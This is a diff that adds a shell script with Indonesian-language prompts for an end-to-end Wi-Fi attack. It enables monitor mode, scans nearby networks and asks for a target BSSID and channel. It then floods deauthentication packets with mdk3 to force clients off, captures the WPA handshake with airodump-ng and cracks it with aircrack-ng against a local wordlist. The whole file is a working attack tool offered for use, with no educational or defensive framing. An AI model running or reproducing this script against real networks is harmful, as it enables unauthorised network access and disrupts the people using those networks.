@@ -1,0 +1,61 @@
+#!/bin/sh
+
+white="\033[1;37m"
+grey="\033[0;37m"
+purple="\033[0;35m"
+red="\033[1;31m"
+green="\033[1;32m"
+yellow="\033[1;33m"
+Purple="\033[0;35m"
+Cyan="\033[0;36m"
+Cafe="\033[0;33m"
+Fiuscha="\033[0;35m"
+blue="\033[1;34m"
+transparent="\e[0m"
+
+echo "    \n"
+echo $red"mengaktifkan mode monitor..."
+
+echo $green
+airmon-ng start wlp9s0
+
+echo $red"mode monitor siap..."
+echo $blue"mulai scanning wifi sekitar..."
+echo $white
+
+mkdir /tmp/hacking
+
+xterm -bg "#000000" -fg "#FFFFFF" -title "wifi monitor..." -e airodump-ng mon0 -w /tmp/hacking/hand
+cat /tmp/hacking/hand-01.csv
+rm /tmp/hacking/*
+
+echo $red"masukan mac : "
+read mac
+echo $yellow"masukan chanel : "
+read chan
+
+echo "\n"
+echo $green"monitor chanel"
+
+xterm -bg "#000000" -fg "#00AA00" -title "chanel mon" -e airodump-ng -c $chan --bssid $mac -w /tmp/hacking/hand mon0 &
+xterm -bg "#000000" -fg "#FF00A4" -title "kill wifi" -e mdk3 mon0 d
+
+echo $yellow"masukan mac akhir: "
+read macser
+
+xterm -bg "#000000" -fg "#00AA00" -title "serang!!!" -e aircrack-ng -w /home/shun/hack/wordlist4.txt -b $macser /tmp/hacking/hand-01.cap
+
+printf $Cyan"simpan handsake y/ENTER : "
+read save
+
+if [ "$save" = "y" ]; then
+  mkdir /home/shun/tmp
+  #rm /tmp/hacking/save/*
+  cp /tmp/hacking/* /home/shun/tmp
+  printf $white"sukses menyimpan handsake\n\n"
+else
+  rm /tmp/hacking/*
+  echo $red"hapus handsake"
+fi
+
+airmon-ng stop mon0
